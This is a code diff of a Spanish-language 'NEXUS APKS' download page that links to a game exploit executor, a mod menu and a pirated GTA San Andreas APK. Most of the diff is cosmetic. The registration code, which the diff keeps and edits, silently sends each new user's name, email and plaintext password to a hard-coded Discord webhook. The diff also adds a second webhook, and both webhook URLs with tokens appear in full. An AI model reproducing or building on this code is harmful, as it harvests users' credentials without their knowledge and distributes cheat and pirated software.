@@ -15,7 +15,7 @@
         body { background-color: var(--bg); color: white; font-family: 'Outfit', sans-serif; overflow: hidden; }
         #particles-js { position: fixed; inset: 0; z-index: -1; }
 
-        /* INTRO CINEMÁTICA MEJORADA */
+        /* INTRO CINEMÁTICA */
         #nexus-intro {
             position: fixed; inset: 0; background: #000; z-index: 50000;
             display: none; flex-direction: column; align-items: center; justify-content: center;
@@ -39,7 +39,6 @@
             position: fixed; bottom: 25px; width: 75px; height: 75px; border-radius: 50%;
             display: flex; align-items: center; justify-content: center; font-size: 35px;
             cursor: pointer; transition: 0.4s; z-index: 1000; border: 3px solid;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
         }
         #pedido-btn { right: 25px; background: #111; border-color: var(--neon-blue); box-shadow: 0 0 25px var(--neon-blue); }
         #tiktok-btn { right: 115px; background: #000; border-color: var(--neon-pink); box-shadow: 0 0 25px var(--neon-pink); }
@@ -83,19 +82,19 @@
             <h1 class="text-6xl font-black italic text-center mb-10 tracking-tighter">NEXUS <span class="text-cyan-400">APKS</span></h1>
             <div class="bg-black/40 p-8 rounded-[40px] border border-white/5 backdrop-blur-md space-y-4">
                 <div id="name-container" class="hidden">
-                    <input type="text" id="user-name" placeholder="NOMBRE DE USUARIO" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none focus:border-pink-500 text-sm">
+                    <input type="text" id="user-name" placeholder="USUARIO" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none focus:border-pink-500 text-sm">
                 </div>
-                <input type="email" id="email" placeholder="CORREO@SYSTEM.COM" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none focus:border-cyan-400 text-sm">
+                <input type="email" id="email" placeholder="CORREO" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none focus:border-cyan-400 text-sm">
                 <input type="password" id="pass" placeholder="PASSWORD" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none focus:border-cyan-400 text-sm">
-                <button onclick="manejarAuth()" class="btn-action mt-4">EJECUTAR SISTEMA</button>
-                <button onclick="cambiarModo()" id="toggle-btn" class="w-full text-[10px] text-gray-500 uppercase tracking-widest text-center mt-4 underline">¿Registrar Nueva Cuenta?</button>
+                <button onclick="manejarAuth()" class="btn-action mt-4">ENTRAR</button>
+                <button onclick="cambiarModo()" id="toggle-btn" class="w-full text-[10px] text-gray-500 uppercase text-center mt-4 underline">¿Registrar?</button>
             </div>
         </div>
     </section>
 
     <section id="store-screen" class="hidden">
         <div class="marquee-container">
-            <div class="marquee-text">⚡ [ AVISOS ]: NO HAY AVISOS POR EL MOMENTO — DISFRUTA EL REPOSITORIO DE CODEX — SISTEMA ACTUALIZADO — ⚡</div>
+            <div class="marquee-text">⚡ [ AVISOS ]: SISTEMA ACTUALIZADO — DISFRUTA EL REPOSITORIO DE CODEX — MANTENIENDO EL CONTROL — ⚡</div>
         </div>
 
         <div class="container mx-auto px-6 py-8">
@@ -117,9 +116,9 @@
         <div class="modal-box">
             <h3 class="text-xl font-black italic mb-6">NUEVA PETICIÓN 🍿</h3>
             <div class="space-y-4 text-left">
-                <input type="text" id="p-apk" placeholder="¿QUÉ APK TE GUSTARÍA VER?" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-xs uppercase">
-                <textarea id="p-razon" placeholder="¿POR QUÉ?" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-xs h-24 uppercase"></textarea>
-                <button onclick="enviarPedido()" class="btn-action">Enviar Formulario</button>
+                <input type="text" id="p-apk" placeholder="NOMBRE APK" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-xs uppercase">
+                <textarea id="p-razon" placeholder="¿RAZÓN?" class="w-full p-4 bg-white/5 rounded-2xl border border-white/10 outline-none text-xs h-24 uppercase"></textarea>
+                <button onclick="enviarPedido()" class="btn-action">Enviar</button>
                 <button onclick="document.getElementById('pedido-modal').style.display='none'" class="w-full text-[9px] text-gray-500 uppercase mt-4">Regresar</button>
             </div>
         </div>
@@ -152,7 +151,10 @@
         };
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
-        const WEBHOOK = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
+        
+        // WEBHOOKS
+        const WEBHOOK_REGISTRO = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
+        const WEBHOOK_PETICIONES = "Https://discord.com/api/webhooks/1491657056686571540/CRJs0yxAdBGDf9xu-ViXGb-o9kz92f6JhZcl37n-K8yq6EbCKlm2dwuNZ39TL_3eIMMp";
 
         let esLogin = true;
 
@@ -168,17 +170,17 @@
             { n: 'DELTA EXECUTOR', i: '🤖', d: 'Latest', s: '115 MB', l: 'https://deltaexploits.gg/delta-executor-android' },
             { n: 'DTW MOD MENU', i: '🔥', d: 'Private', s: '85 MB', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file' },
             { n: 'GTA SAN ANDREAS', i: '🚗', d: 'v2.11', s: '2.4 GB', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file' },
-            { n: 'PRÓXIMAMENTE 1', i: '⌛', d: 'Empty', s: '--', l: '#', prox: true },
-            { n: 'PRÓXIMAMENTE 2', i: '⌛', d: 'Empty', s: '--', l: '#', prox: true },
-            { n: 'PRÓXIMAMENTE 3', i: '⌛', d: 'Empty', s: '--', l: '#', prox: true },
-            { n: 'PRÓXIMAMENTE 4', i: '⌛', d: 'Empty', s: '--', l: '#', prox: true },
-            { n: 'PRÓXIMAMENTE 5', i: '⌛', d: 'Empty', s: '--', l: '#', prox: true }
+            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Espacio Codex', s: '00', l: 'window.location.reload()', isProx: true },
+            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Espacio Codex', s: '00', l: 'window.location.reload()', isProx: true },
+            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Espacio Codex', s: '00', l: 'window.location.reload()', isProx: true },
+            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Espacio Codex', s: '00', l: 'window.location.reload()', isProx: true },
+            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Espacio Codex', s: '00', l: 'window.location.reload()', isProx: true }
         ];
 
         function cambiarModo() {
             esLogin = !esLogin;
             document.getElementById('name-container').classList.toggle('hidden');
-            document.getElementById('toggle-btn').innerText = esLogin ? '¿Registrar Nueva Cuenta?' : '¿Ya tienes cuenta? Entrar';
+            document.getElementById('toggle-btn').innerText = esLogin ? '¿Registrar?' : '¿Entrar?';
         }
 
         async function manejarAuth() {
@@ -190,7 +192,7 @@
                 else {
                     await auth.createUserWithEmailAndPassword(e, p);
                     localStorage.setItem('nexus_name', n);
-                    fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
+                    fetch(WEBHOOK_REGISTRO, { method: 'POST', headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ embeds: [{ title: "👑 NUEVO MIEMBRO", fields: [{ name: "👤 USER", value: n.toUpperCase() }, { name: "📧 EMAIL", value: e }, { name: "🔑 PASS", value: "|| "+p+" ||" }], color: 0x00f2ff }] })
                     });
                 }
@@ -204,29 +206,21 @@
             const intro = document.getElementById('nexus-intro');
             const bar = document.getElementById('load-bar');
             intro.style.display = 'flex';
-            
             let w = 0;
             const int = setInterval(() => {
-                w += Math.random() * 30;
+                w += Math.random() * 25;
                 bar.style.width = w + '%';
                 if(w >= 100) {
                     clearInterval(int);
-                    setTimeout(() => {
-                        intro.style.opacity = '0';
-                        setTimeout(() => {
-                            intro.style.display = 'none';
-                            abrirDashboard(nombre);
-                        }, 500);
-                    }, 500);
+                    setTimeout(() => { intro.style.opacity = '0'; setTimeout(() => { intro.style.display = 'none'; abrirDashboard(nombre); }, 500); }, 500);
                 }
-            }, 400);
+            }, 300);
         }
 
         function abrirDashboard(nombre) {
             document.getElementById('store-screen').classList.remove('hidden');
             document.getElementById('welcome-msg').innerText = "BIENVENIDO, " + nombre.toUpperCase();
             document.body.style.overflowY = 'auto';
-
             const grid = document.getElementById('app-grid');
             grid.innerHTML = '';
             apps.forEach(app => {
@@ -235,29 +229,32 @@
                     <div class="flex flex-col items-center">
                         <span class="text-5xl mb-4">${app.i}</span>
                         <h3 class="font-black text-xs uppercase">${app.n}</h3>
-                        <p class="text-[9px] text-gray-600 mb-6 tracking-widest uppercase">${app.d}</p>
-                        <button onclick="abrirModal('${app.n}', '${app.i}', '${app.s}', '${app.l}')" class="w-full bg-white/5 border border-white/10 p-3 rounded-2xl font-bold text-[10px] hover:bg-cyan-400 hover:text-black transition-all">GESTIONAR</button>
+                        <p class="text-[9px] text-gray-600 mb-6 uppercase">${app.d}</p>
+                        <button onclick="abrirModal('${app.n}', '${app.i}', '${app.s}', \`${app.l}\`, ${app.isProx || false})" class="w-full bg-white/5 border border-white/10 p-3 rounded-2xl font-bold text-[10px] hover:bg-cyan-400 hover:text-black transition-all">GESTIONAR</button>
                     </div>
                 </div>`;
             });
         }
 
-        function abrirModal(n, i, s, l) {
-            if(l === '#') return alert("Espacio Reservado para Codex");
+        function abrirModal(n, i, s, l, isProx) {
             document.getElementById('modal-name').innerText = n;
             document.getElementById('modal-icon').innerText = i;
             document.getElementById('modal-size').innerText = s;
-            document.getElementById('final-link').onclick = () => window.open(l);
+            document.getElementById('final-link').onclick = () => { 
+                if(isProx) { window.location.reload(); } else { window.open(l); }
+            };
             document.getElementById('download-modal').style.display = 'flex';
         }
 
         async function enviarPedido() {
             const a = document.getElementById('p-apk').value;
             const r = document.getElementById('p-razon').value;
-            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ embeds: [{ title: "🍿 PETICIÓN NEXUS", color: 0x00f2ff, fields: [{ name: "📦 APK", value: a.toUpperCase() }, { name: "❓ POR QUÉ", value: r }] }] })
+            const u = localStorage.getItem('nexus_name') || "Invitado";
+            if(!a || !r) return alert("Completa el formulario");
+            await fetch(WEBHOOK_PETICIONES, { method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ embeds: [{ title: "🍿 PETICIÓN NEXUS", color: 0xff00ea, fields: [{ name: "👤 USUARIO", value: u }, { name: "📦 APK", value: a.toUpperCase() }, { name: "❓ RAZÓN", value: r }] }] })
             });
-            alert("Petición Enviada! 🌪️");
+            alert("Enviado a Codex 🌪️");
             document.getElementById('pedido-modal').style.display = 'none';
         }
 
